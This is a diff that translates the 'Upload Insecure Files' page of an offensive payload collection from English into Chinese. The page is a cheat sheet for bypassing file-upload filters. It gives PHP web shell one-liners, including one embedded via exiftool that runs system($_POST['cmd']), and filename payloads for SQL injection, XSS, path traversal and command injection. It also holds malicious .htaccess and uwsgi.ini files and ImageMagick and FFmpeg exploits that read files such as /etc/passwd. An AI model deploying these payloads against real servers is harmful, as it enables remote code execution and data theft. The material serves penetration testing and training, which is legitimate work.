@@ -1,37 +1,39 @@
-# Upload Insecure Files
+[原文文档](README.en.md)
 
-> Uploaded files may pose a significant risk if not handled correctly. A remote attacker could send a multipart/form-data POST request with a specially-crafted filename or mime type and execute arbitrary code.
+# 不安全文件上传
 
-## Summary
+> 如果处理不当，上传的文件可能会构成重大风险。远程攻击者可以发送带有特制文件名或 mime 类型的 multipart/form-data POST 请求并执行任意代码。
 
-* [Tools](#tools)
-* [Methodology](#methodology)
-    * [Defaults Extensions](#defaults-extensions)
-    * [Upload Tricks](#upload-tricks)
-    * [Filename Vulnerabilities](#filename-vulnerabilities)
-    * [Picture Compression](#picture-compression)
-    * [Picture Metadata](#picture-metadata)
-    * [Configuration Files](#configuration-files)
+## 概述
+
+* [工具](#工具)
+* [方法论](#方法论)
+    * [默认扩展名](#默认扩展名)
+    * [上传技巧](#上传技巧)
+    * [文件名漏洞](#文件名漏洞)
+    * [图片压缩](#图片压缩)
+    * [图片元数据](#图片元数据)
+    * [配置文件](#配置文件)
     * [CVE - ImageMagick](#cve---imagemagick)
     * [CVE - FFMpeg HLS](#cve---ffmpeg-hls)
-* [Labs](#labs)
-* [References](#references)
+* [实验室](#实验室)
+* [参考文献](#参考文献)
 
-## Tools
+## 工具
 
-* [almandin/fuxploiderFuxploider](https://github.com/almandin/fuxploider) - File upload vulnerability scanner and exploitation tool.
-* [Burp/Upload Scanner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa) -  HTTP file upload scanner for Burp Proxy.
-* [ZAP/FileUpload](https://www.zaproxy.org/blog/2021-08-20-zap-fileupload-addon/) -  OWASP ZAP add-on for finding vulnerabilities in File Upload functionality.
+* [almandin/fuxploiderFuxploider](https://github.com/almandin/fuxploider) - 文件上传漏洞扫描和利用工具。
+* [Burp/Upload Scanner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa) - Burp 代理的 HTTP 文件上传扫描器。
+* [ZAP/FileUpload](https://www.zaproxy.org/blog/2021-08-20-zap-fileupload-addon/) - 用于查找文件上传功能中漏洞的 OWASP ZAP 附加组件。
 
-## Methodology
+## 方法论
 
 ![file-upload-mindmap.png](https://github.com/swisskyrepo/PayloadsAllTheThings/raw/master/Upload%20Insecure%20Files/Images/file-upload-mindmap.png?raw=true)
 
-### Defaults Extensions
+### 默认扩展名
 
-Here is a list of the default extensions for web shell pages in the selected languages (PHP, ASP, JSP).
+以下是在选定语言（PHP、ASP、JSP）中网页 shell 页面的默认扩展名列表。
 
-* PHP Server
+* PHP 服务器
 
     ```powershell
     .php
@@ -40,7 +42,7 @@ Here is a list of the default extensions for web shell pages in the selected lan
     .php5
     .php7
 
-    # Less known PHP extensions
+    # 较不为人知的 PHP 扩展
     .pht
     .phps
     .phar
@@ -51,7 +53,7 @@ Here is a list of the default extensions for web shell pages in the selected lan
     .inc
     ```
 
-* ASP Server
+* ASP 服务器
 
     ```powershell
     .asp
@@ -60,7 +62,7 @@ Here is a list of the default extensions for web shell pages in the selected lan
     .cer # (IIS <= 7.5)
     .asa # (IIS <= 7.5)
     shell.aspx;1.jpg # (IIS < 7.0)
-    shell.soap
+    .shell.soap
     ```
 
 * JSP : `.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .actions`
@@ -68,56 +70,56 @@ Here is a list of the default extensions for web shell pages in the selected lan
 * Coldfusion: `.cfm, .cfml, .cfc, .dbm`
 * Node.js: `.js, .json, .node`
 
-Other extensions that can be abused to trigger other vulnerabilities.
+其他可能被滥用来触发其他漏洞的扩展。
 
 * `.svg`: XXE, XSS, SSRF
 * `.gif`: XSS
-* `.csv`: CSV Injection
+* `.csv`: CSV 注入
 * `.xml`: XXE
 * `.avi`: LFI, SSRF
-* `.js` : XSS, Open Redirect
-* `.zip`: RCE, DOS, LFI Gadget
-* `.html` : XSS, Open Redirect
+* `.js` : XSS, 开放重定向
+* `.zip`: RCE, DOS, LFI 工具
+* `.html` : XSS, 开放重定向
 
-### Upload Tricks
+### 上传技巧
 
-**Extensions**:
+**扩展名**：
 
-* Use double extensions : `.jpg.php, .png.php5`
-* Use reverse double extension (useful to exploit Apache misconfigurations where anything with extension .php, but not necessarily ending in .php will execute code): `.php.jpg`
-* Random uppercase and lowercase : `.pHp, .pHP5, .PhAr`
-* Null byte (works well against `pathinfo()`)
+* 使用双扩展名：`.jpg.php, .png.php5`
+* 使用反向双扩展名（用于利用 Apache 配置错误，其中任何具有 .php 扩展名的文件，但不一定要以 .php 结尾将执行代码）：`.php.jpg`
+* 随机大小写：`.pHp, .pHP5, .PhAr`
+* 零字节（对 `pathinfo()` 效果很好）
     * `.php%00.gif`
     * `.php\x00.gif`
     * `.php%00.png`
     * `.php\x00.png`
     * `.php%00.jpg`
     * `.php\x00.jpg`
-* Special characters
-    * Multiple dots : `file.php......` , on Windows when a file is created with dots at the end those will be removed.
-    * Whitespace and new line characters
+* 特殊字符
+    * 多个点：`file.php......`，在 Windows 上，当文件以点结尾创建时，这些点将被删除。
+    * 空白字符和换行符
         * `file.php%20`
         * `file.php%0d%0a.jpg`
         * `file.php%0a`
-    * Right to Left Override (RTLO): `name.%E2%80%AEphp.jpg` will became `name.gpj.php`.
-    * Slash: `file.php/`, `file.php.\`, `file.j\sp`, `file.j/sp`
-    * Multiple special characters: `file.jsp/././././.`
-    * UTF8 filename: `Content-Disposition: form-data; name="anyBodyParam"; filename*=UTF8''myfile%0a.txt`
+    * 从右到左覆盖 (RTLO): `name.%E2%80%AEphp.jpg` 将变为 `name.gpj.php`。
+    * 斜杠：`file.php/`, `file.php.\`, `file.j\sp`, `file.j/sp`
+    * 多个特殊字符：`file.jsp/././././.`
+    * UTF8 文件名：`Content-Disposition: form-data; name="anyBodyParam"; filename*=UTF8''myfile%0a.txt`
 
-* On Windows OS, `include`, `require` and `require_once` functions will convert "foo.php" followed by one or more of the chars `\x20` ( ), `\x22` ("), `\x2E` (.), `\x3C` (<), `\x3E` (>) back to "foo.php".
-* On Windows OS, `fopen` function will convert "foo.php" followed by one or more of the chars `\x2E` (.), `\x2F` (/), `\x5C` (\) back to "foo.php".
-* On Windows OS, `move_uploaded_file` function will convert "foo.php" followed by one or more of the chars `\x2E` (.), `\x2F` (/), `\x5C` (\) back to "foo.php".
+* 在 Windows 操作系统上，`include`、`require` 和 `require_once` 函数将把后面跟一个或多个字符 `\x20` ( )、`\x22` (")、`\x2E` (.)、`\x3C` (<)、`\x3E` (>) 的 "foo.php" 转换回 "foo.php"。
+* 在 Windows 操作系统上，`fopen` 函数将把后面跟一个或多个字符 `\x2E` (.)、`\x2F` (/)、`\x5C` (\) 的 "foo.php" 转换回 "foo.php"。
+* 在 Windows 操作系统上，`move_uploaded_file` 函数将把后面跟一个或多个字符 `\x2E` (.)、`\x2F` (/)、`\x5C` (\) 的 "foo.php" 转换回 "foo.php"。
 
-* On Windows OS, when running PHP on IIS some characters are automatically converted to other characters when it is going to save a file (e.g. `web<<` becomes `web**` and can replace `web.config`).
-    * `\x3E` (>) is converted to `\x3F` (?)
-    * `\x3C` (<) is converted to `\x2A` (*)
-    * `\x22` (") is converted to `\x2E` (.), to use this trick in a file upload request the "`Content-Disposition`" header should use single quotes (e.g. filename='web"config').
+* 在 Windows 操作系统上，在 IIS 上运行 PHP 时，某些字符在保存文件时会自动转换为其他字符（例如 `web<<` 变为 `web**` 并且可以替换 `web.config`）。
+    * `\x3E` (>) 转换为 `\x3F` (?)
+    * `\x3C` (<) 转换为 `\x2A` (*)
+    * `\x22` (") 转换为 `\x2E` (.)，要在文件上传请求中使用此技巧，"`Content-Disposition`" 头应使用单引号（例如 filename='web"config'）。
 
-**File Identification**:
+**文件识别**：
 
-MIME type, a MIME type (Multipurpose Internet Mail Extensions type) is a standardized identifier that tells browsers, servers, and applications what kind of file or data is being handled. It consists of a type and a subtype, separated by a slash. Change `Content-Type : application/x-php` or `Content-Type : application/octet-stream` to `Content-Type : image/gif` to disguise the content as an image.
+MIME 类型，MIME 类型（多用途互联网邮件扩展类型）是一个标准化标识符，告诉浏览器、服务器和应用程序正在处理什么类型的文件或数据。它由一个类型和一个子类型组成，用斜杠分隔。将 `Content-Type : application/x-php` 或 `Content-Type : application/octet-stream` 更改为 `Content-Type : image/gif` 以将内容伪装成图像。
 
-* Common images content-types:
+* 常见图像内容类型：
 
     ```cs
     Content-Type: image/gif
@@ -125,7 +127,7 @@ MIME type, a MIME type (Multipurpose Internet Mail Extensions type) is a standar
     Content-Type: image/jpeg
     ```
 
-* Content-Type wordlist: [SecLists/web-all-content-types.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)
+* Content-Type 词表：[SecLists/web-all-content-types.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)
 
     ```cs
     text/php
@@ -136,63 +138,63 @@ MIME type, a MIME type (Multipurpose Internet Mail Extensions type) is a standar
     application/x-httpd-php-source
     ```
 
-* Set the `Content-Type` twice, once for unallowed type and once for allowed.
+* 两次设置 `Content-Type`，一次为不允许的类型，一次为允许的类型。
 
-[Magic Bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) - Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application.
+[魔法字节](https://en.wikipedia.org/wiki/List_of_file_signatures) - 有时应用程序根据文件的前几个签名字节来识别文件类型。在文件中添加/替换它们可能会欺骗应用程序。
 
 * PNG: `\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[`
 * JPG: `\xff\xd8\xff`
-* GIF: `GIF87a` OR `GIF8;`
+* GIF: `GIF87a` 或 `GIF8;`
 
-**File Encapsulation**:
+**文件封装**：
 
-Using NTFS alternate data stream (ADS) in Windows.
-In this case, a colon character ":" will be inserted after a forbidden extension and before a permitted one. As a result, an empty file with the forbidden extension will be created on the server (e.g. "`file.asax:.jpg`"). This file might be edited later using other techniques such as using its short filename. The "::$data" pattern can also be used to create non-empty files. Therefore, adding a dot character after this pattern might also be useful to bypass further restrictions (.e.g. "`file.asp::$data.`")
+在 Windows 中使用 NTFS 备用数据流 (ADS)。
+在这种情况下，冒号字符 ":" 将插入到禁止的扩展名之后和允许的扩展名之前。结果，将在服务器上创建一个带有禁止扩展名的空文件（例如 "`file.asax:.jpg`"）。该文件可能稍后使用其他技术进行编辑，例如使用其短文件名。"::$data" 模式也可用于创建非空文件。因此，在此模式后添加点字符也可能有助于绕过进一步限制（例如 "`file.asp::$data.`"）
 
-**Other Techniques**:
+**其他技术**：
 
-PHP web shells don't always have the `<?php` tag, here are some alternatives:
+PHP 网页 shell 并不总是有 `<?php` 标签，以下是一些替代方案：
 
-* Using a PHP script tag `<script language="php">`
+* 使用 PHP 脚本标签 `<script language="php">`
 
     ```html
     <script language="php">system("id");</script>
     ```
 
-* The `<?=` is shorthand syntax in PHP for outputting values. It is equivalent to using `<?php echo`.
+* `<?=` 是 PHP 中输出值的简写语法。它相当于使用 `<?php echo`。
 
     ```php
     <?=`$_GET[0]`?>
     ```
 
-### Filename Vulnerabilities
+### 文件名漏洞
 
-Sometimes the vulnerability is not the upload but how the file is handled after. You might want to upload files with payloads in the filename.
+有时漏洞不在于上传，而在于之后如何处理文件。您可能想要上传文件名中包含有效负载的文件。
 
-* Time-Based SQLi Payloads: e.g. `poc.js'(select*from(select(sleep(20)))a)+'.extension`
-* LFI/Path Traversal Payloads:  e.g. `image.png../../../../../../../etc/passwd`
-* XSS Payloads e.g. `'"><img src=x onerror=alert(document.domain)>.extension`
-* File Traversal e.g. `../../../tmp/lol.png`
-* Command Injection e.g. `; sleep 10;`
+* 基于时间的 SQL 注入有效负载：例如 `poc.js'(select*from(select(sleep(20)))a)+'.extension`
+* LFI/路径遍历有效负载：例如 `image.png../../../../../../../etc/passwd`
+* XSS 有效负载例如 `'"><img src=x onerror=alert(document.domain)>.extension`
+* 文件遍历例如 `../../../tmp/lol.png`
+* 命令注入例如 `; sleep 10;`
 
-Also you upload:
+同时您还可以上传：
 
-* HTML/SVG files to trigger an XSS
-* EICAR file to check the presence of an antivirus
+* HTML/SVG 文件来触发 XSS
+* EICAR 文件来检查防病毒软件的存在
 
-### Picture Compression
+### 图片压缩
 
-Create valid pictures hosting PHP code. Upload the picture and use a **Local File Inclusion** to execute the code. The shell can be called with the following command : `curl 'http://localhost/test.php?0=system' --data "1='ls'"`.
+创建包含 PHP 代码的有效图片。上传图片并使用**本地文件包含**来执行代码。Shell 可以用以下命令调用：`curl 'http://localhost/test.php?0=system' --data "1='ls'"`。
 
-* Picture Metadata, hide the payload inside a comment tag in the metadata.
-* Picture Resize, hide the payload within the compression algorithm in order to bypass a resize. Also defeating `getimagesize()` and `imagecreatefromgif()`.
-    * [JPG](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l): use createBulletproofJPG.py
-    * [PNG](https://blog.isec.pl/injection-points-in-popular-image-formats/): use createPNGwithPLTE.php
-    * [GIF](https://blog.isec.pl/injection-points-in-popular-image-formats/): use createGIFwithGlobalColorTable.php
+* 图片元数据，在元数据的注释标签内隐藏有效负载。
+* 图片调整大小，在压缩算法内隐藏有效负载以绕过调整大小。同时击败 `getimagesize()` 和 `imagecreatefromgif()`。
+    * [JPG](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l): 使用 createBulletproofJPG.py
+    * [PNG](https://blog.isec.pl/injection-points-in-popular-image-formats/): 使用 createPNGwithPLTE.php
+    * [GIF](https://blog.isec.pl/injection-points-in-popular-image-formats/): 使用 createGIFwithGlobalColorTable.php
 
-### Picture Metadata
+### 图片元数据
 
-Create a custom picture and insert exif tag with `exiftool`. A list of multiple exif tags can be found at [exiv2.org](https://exiv2.org/tags.html)
+创建自定义图片并使用 `exiftool` 插入 exif 标签。多个 exif 标签的列表可以在 [exiv2.org](https://exiv2.org/tags.html) 找到
 
 ```ps1
 convert -size 110x110 xc:white payload.jpg
@@ -200,15 +202,15 @@ exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Exa
 exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
 ```
 
-### Configuration Files
+### 配置文件
 
-If you are trying to upload files to a :
+如果您尝试将文件上传到：
 
-* PHP server, take a look at the [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess) trick to execute code.
-* ASP server, take a look at the [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config) trick to execute code.
-* uWSGI server, take a look at the [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini) trick to execute code.
+* PHP 服务器，请查看 [.htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess) 技巧来执行代码。
+* ASP 服务器，请查看 [web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config) 技巧来执行代码。
+* uWSGI 服务器，请查看 [uwsgi.ini](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20uwsgi.ini/uwsgi.ini) 技巧来执行代码。
 
-Configuration files examples
+配置文件示例
 
 * [Apache: .htaccess](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20Apache%20.htaccess)
 * [IIS: web.config](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config)
@@ -217,49 +219,49 @@ Configuration files examples
 
 #### Apache: .htaccess
 
-The `AddType` directive in an `.htaccess` file is used to specify the MIME (Multipurpose Internet Mail Extensions) type for different file extensions on an Apache HTTP Server. This directive helps the server understand how to handle different types of files and what content type to associate with them when serving them to clients (such as web browsers).  
+`.htaccess` 文件中的 `AddType` 指令用于指定 Apache HTTP 服务器上不同文件扩展名的 MIME（多用途互联网邮件扩展）类型。该指令帮助服务器理解如何处理不同类型的文件以及在向客户端（如网络浏览器）提供文件时应关联什么内容类型。
 
-Here is the basic syntax of the AddType directive:
+以下是 AddType 指令的基本语法：
 
 ```ps1
 AddType mime-type extension [extension ...]
 ```
 
-Exploit `AddType` directive by uploading an .htaccess file with the following content.
+通过上传包含以下内容的 .htaccess 文件来利用 `AddType` 指令。
 
 ```ps1
 AddType application/x-httpd-php .rce
 ```
 
-Then upload any file with `.rce` extension.
+然后上传任何带有 `.rce` 扩展名的文件。
 
 #### WSGI: uwsgi.ini
 
-uWSGI configuration files can include “magic” variables, placeholders and operators defined with a precise syntax. The ‘@’ operator in particular is used in the form of @(filename) to include the contents of a file. Many uWSGI schemes are supported, including “exec” - useful to read from a process’s standard output. These operators can be weaponized for Remote Command Execution or Arbitrary File Write/Read when a .ini configuration file is parsed:
+uWSGI 配置文件可以包含"魔法"变量、占位符和用精确语法定义的操作符。'@' 操作符特别用于形式 @(filename) 来包含文件的内容。支持许多 uWSGI 方案，包括"exec" - 用于从进程的标准输出读取。当解析 .ini 配置文件时，这些操作符可以被武器化用于远程命令执行或任意文件写入/读取：
 
-Example of a malicious `uwsgi.ini` file:
+恶意 `uwsgi.ini` 文件的示例：
 
 ```ini
 [uwsgi]
-; read from a symbol
+; 从符号读取
 foo = @(sym://uwsgi_funny_function)
-; read from binary appended data
+; 从二进制追加数据读取
 bar = @(data://[REDACTED])
-; read from http
+; 从 http 读取
 test = @(http://[REDACTED])
-; read from a file descriptor
+; 从文件描述符读取
 content = @(fd://[REDACTED])
-; read from a process stdout
+; 从进程标准输出读取
 body = @(exec://whoami)
-; call a function returning a char *
+; 调用返回 char * 的函数
 characters = @(call://uwsgi_func)
 ```
 
-When the configuration file will be parsed (e.g. restart, crash or autoreload) payload will be executed.
+当配置文件被解析时（例如重启、崩溃或自动重新加载）有效负载将被执行。
 
-#### Dependency Manager
+#### 依赖管理器
 
-Alternatively you may be able to upload a JSON file with a custom scripts, try to overwrite a dependency manager configuration file.
+或者您可能能够上传带有自定义脚本的 JSON 文件，尝试覆盖依赖管理器配置文件。
 
 * package.json
 
@@ -281,13 +283,13 @@ Alternatively you may be able to upload a JSON file with a custom scripts, try t
 
 ### CVE - ImageMagick
 
-If the backend is using ImageMagick to resize/convert user images, you can try to exploit well-known vulnerabilities such as ImageTragik.
+如果后端使用 ImageMagick 来调整/转换用户图像，您可以尝试利用众所周知的漏洞，如 ImageTragik。
 
 #### CVE-2016–3714 - ImageTragik
 
-Upload this content with an image extension to exploit the vulnerability (ImageMagick , 7.0.1-1)
+上传带有图像扩展名的此内容以利用漏洞（ImageMagick，7.0.1-1）
 
-* ImageTragik - example #1
+* ImageTragik - 示例 #1
 
     ```powershell
     push graphic-context
@@ -296,7 +298,7 @@ Upload this content with an image extension to exploit the vulnerability (ImageM
     pop graphic-context
     ```
 
-* ImageTragik - example #3
+* ImageTragik - 示例 #3
 
     ```powershell
     %!PS
@@ -309,7 +311,7 @@ Upload this content with an image extension to exploit the vulnerability (ImageM
     mark /OutputFile (%pipe%id) currentdevice putdeviceprops
     ```
 
-The vulnerability can be triggered by using the `convert` command.
+该漏洞可以通过使用 `convert` 命令来触发。
 
 ```ps1
 convert shellexec.jpeg whatever.gif
@@ -317,32 +319,32 @@ convert shellexec.jpeg whatever.gif
 
 #### CVE-2022-44268
 
-CVE-2022-44268 is an information disclosure vulnerability identified in ImageMagick. An attacker can exploit this by crafting a malicious image file that, when processed by ImageMagick, can disclose information from the local filesystem of the server running the vulnerable version of the software.
+CVE-2022-44268 是 ImageMagick 中识别的信息披露漏洞。攻击者可以通过制作恶意图像文件来利用此漏洞，当由 ImageMagick 处理时，该文件可以披露运行该软件易受攻击版本的服务器的本地文件系统中的信息。
 
-* Generate the payload
+* 生成有效负载
 
     ```ps1
     apt-get install pngcrush imagemagick exiftool exiv2 -y
     pngcrush -text a "profile" "/etc/passwd" exploit.png
     ```
 
-* Trigger the exploit by uploading the file. The backend might use something like `convert pngout.png pngconverted.png`
-* Download the converted picture and inspect its content with: `identify -verbose pngconverted.png`
-* Convert the exfiltrated data: `python3 -c 'print(bytes.fromhex("HEX_FROM_FILE").decode("utf-8"))'`
+* 通过上传文件来触发漏洞利用。后端可能使用类似 `convert pngout.png pngconverted.png` 的命令
+* 下载转换后的图片并检查其内容：`identify -verbose pngconverted.png`
+* 转换泄露的数据：`python3 -c 'print(bytes.fromhex("HEX_FROM_FILE").decode("utf-8"))'`
 
-More payloads in the folder `Picture ImageMagick/`.
+更多有效负载在文件夹 `Picture ImageMagick/` 中。
 
 ### CVE - FFMpeg HLS
 
-FFmpeg is an open source software used for processing audio and video formats. You can use a malicious HLS playlist inside an AVI video to read arbitrary files.
+FFmpeg 是一个用于处理音频和视频格式的开源软件。您可以在 AVI 视频内使用恶意 HLS 播放列表来读取任意文件。
 
 1. `./gen_xbin_avi.py file://<filename> file_read.avi`
-2. Upload `file_read.avi` to some website that processes videofiles
-3. On server side, done by the videoservice: `ffmpeg -i file_read.avi output.mp4`
-4. Click "Play" in the videoservice.
-5. If you are lucky, you'll the content of `<filename>` from the server.
+2. 将 `file_read.avi` 上传到处理视频文件的某个网站
+3. 在服务器端，由视频服务完成：`ffmpeg -i file_read.avi output.mp4`
+4. 在视频服务中点击"播放"。
+5. 如果您幸运的话，您将从服务器获取 `<filename>` 的内容。
 
-The script creates an AVI that contains an HLS playlist inside GAB2. The playlist generated by this script looks like this:
+该脚本创建一个包含 GAB2 内 HLS 播放列表的 AVI。此脚本生成的播放列表如下所示：
 
 ```ps1
 #EXTM3U
@@ -354,34 +356,34 @@ GOD.txt
 #EXT-X-ENDLIST
 ```
 
-More payloads in the folder `CVE FFmpeg HLS/`.
+更多有效负载在文件夹 `CVE FFmpeg HLS/` 中。
 
-## Labs
+## 实验室
 
-* [PortSwigger - Labs on File Uploads](https://portswigger.net/web-security/all-labs#file-upload-vulnerabilities)
-* [Root Me - File upload - Double extensions](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions)
-* [Root Me - File upload - MIME type](https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type)
-* [Root Me - File upload - Null byte](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Null-byte)
-* [Root Me - File upload - ZIP](https://www.root-me.org/en/Challenges/Web-Server/File-upload-ZIP)
-* [Root Me - File upload - Polyglot](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Polyglot)
+* [PortSwigger - 文件上传实验室](https://portswigger.net/web-security/all-labs#file-upload-vulnerabilities)
+* [Root Me - 文件上传 - 双扩展名](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions)
+* [Root Me - 文件上传 - MIME 类型](https://www.root-me.org/en/Challenges/Web-Server/File-upload-MIME-type)
+* [Root Me - 文件上传 - 零字节](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Null-byte)
+* [Root Me - 文件上传 - ZIP](https://www.root-me.org/en/Challenges/Web-Server/File-upload-ZIP)
+* [Root Me - 文件上传 - 混合文件](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Polyglot)
 
-## References
+## 参考文献
 
-* [A New Vector For “Dirty” Arbitrary File Write to RCE - Doyensec - Maxence Schmitt and Lorenzo Stella - 28 Feb 2023](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
-* [Arbitrary File Upload Tricks In Java - pyn3rd - 2022-05-07](https://pyn3rd.github.io/2022/05/07/Arbitrary-File-Upload-Tricks-In-Java/)
-* [Attacking Webservers Via .htaccess - Eldar Marcussen - May 17, 2011](http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html)
-* [BookFresh Tricky File Upload Bypass to RCE - Ahmed Aboul-Ela - November 29, 2014](http://web.archive.org/web/20141231210005/https://secgeek.net/bookfresh-vulnerability/)
-* [Bulletproof Jpegs Generator - Damien Cauquil (@virtualabs) - April 9, 2012](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l)
-* [Encoding Web Shells in PNG IDAT chunks - phil - 04-06-2012](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
-* [File Upload - HackTricks - 20/7/2024](https://book.hacktricks.xyz/pentesting-web/file-upload)
-* [File Upload and PHP on IIS: >=? and <=* and "=. - Soroush Dalili (@irsdl) - July 23, 2014](https://soroush.me/blog/2014/07/file-upload-and-php-on-iis-wildcards/)
-* [File Upload restrictions bypass - Haboob Team - July 24, 2018](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)
-* [IIS - SOAP - Navigating The Shadows - 0xbad53c - 19/5/2024](https://red.0xbad53c.com/red-team-operations/initial-access/webshells/iis-soap)
-* [Injection points in popular image formats - Daniel Kalinowski‌‌ - Nov 8, 2019](https://blog.isec.pl/injection-points-in-popular-image-formats/)
-* [Insomnihack Teaser 2019 / l33t-hoster - Ian Bouchard (@Corb3nik) - January 20, 2019](http://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster)
-* [Inyección de código en imágenes subidas y tratadas con PHP-GD - hackplayers - March 22, 2020](https://www.hackplayers.com/2020/03/inyeccion-de-codigo-en-imagenes-php-gd.html)
-* [La PNG qui se prenait pour du PHP - Philippe Paget (@PagetPhil) - February, 23 2014](https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/)
-* [More Ghostscript Issues: Should we disable PS coders in policy.xml by default? - Tavis Ormandy - 21 Aug 2018](http://openwall.com/lists/oss-security/2018/08/21/2)
-* [PHDays - Attacks on video converters:a year later - Emil Lerner, Pavel Cheremushkin - December 20, 2017](https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit#slide=id.p)
-* [Protection from Unrestricted File Upload Vulnerability - Narendra Shinde - October 22, 2015](https://blog.qualys.com/securitylabs/2015/10/22/unrestricted-file-upload-vulnerability)
-* [The .phpt File Structure - PHP Internals Book - October 18, 2017](https://www.phpinternalsbook.com/tests/phpt_file_structure.html)
+* [一个新的"脏"任意文件写入到 RCE 的向量 - Doyensec - Maxence Schmitt 和 Lorenzo Stella - 2023年2月28日](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
+* [Java 中的任意文件上传技巧 - pyn3rd - 2022年5月7日](https://pyn3rd.github.io/2022/05/07/Arbitrary-File-Upload-Tricks-In-Java/)
+* [通过 .htaccess 攻击 Web 服务器 - Eldar Marcussen - 2011年5月17日](http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html)
+* [BookFresh 棘手的文件上传绕过到 RCE - Ahmed Aboul-Ela - 2014年11月29日](http://web.archive.org/web/20141231210005/https://secgeek.net/bookfresh-vulnerability/)
+* [防弹 JPEG 生成器 - Damien Cauquil (@virtualabs) - 2012年4月9日](https://virtualabs.fr/Nasty-bulletproof-Jpegs-l)
+* [在 PNG IDAT 块中编码 Web Shell - phil - 2012年6月4日](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
+* [文件上传 - HackTricks - 2024年7月20日](https://book.hacktricks.xyz/pentesting-web/file-upload)
+* [IIS 上的文件上传和 PHP: >=? and <=* and "= - Soroush Dalili (@irsdl) - 2014年7月23日](https://soroush.me/blog/2014/07/file-upload-and-php-on-iis-wildcards/)
+* [文件上传限制绕过 - Haboob 团队 - 2018年7月24日](https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf)
+* [IIS - SOAP - 在阴影中导航 - 0xbad53c - 2024年5月19日](https://red.0xbad53c.com/red-team-operations/initial-access/webshells/iis-soap)
+* [流行图像格式中的注入点 - Daniel Kalinowski‌‌ - 2019年11月8日](https://blog.isec.pl/injection-points-in-popular-image-formats/)
+* [Insomnihack Teaser 2019 / l33t-hoster - Ian Bouchard (@Corb3nik) - 2019年1月20日](http://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster)
+* [上传并用 PHP-GD 处理的图像中的代码注入 - hackplayers - 2020年3月22日](https://www.hackplayers.com/2020/03/inyeccion-de-codigo-en-imagenes-php-gd.html)
+* [把自己当成 PHP 的 PNG - Philippe Paget (@PagetPhil) - 2014年2月23日](https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/)
+* [更多 Ghostscript 问题：我们是否应该在默认情况下在 policy.xml 中禁用 PS 编码器？ - Tavis Ormandy - 2018年8月21日](http://openwall.com/lists/oss-security/2018/08/21/2)
+* [PHDays - 视频转换器攻击：一年后 - Emil Lerner, Pavel Cheremushkin - 2017年12月20日](https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit#slide=id.p)
+* [不受限制的文件上传漏洞的保护 - Narendra Shinde - 2015年10月22日](https://blog.qualys.com/securitylabs/2015/10/22/unrestricted-file-upload-vulnerability)
+* [phpt 文件结构 - PHP 内部手册 - 2017年10月18日](https://www.phpinternalsbook.com/tests/phpt_file_structure.html)
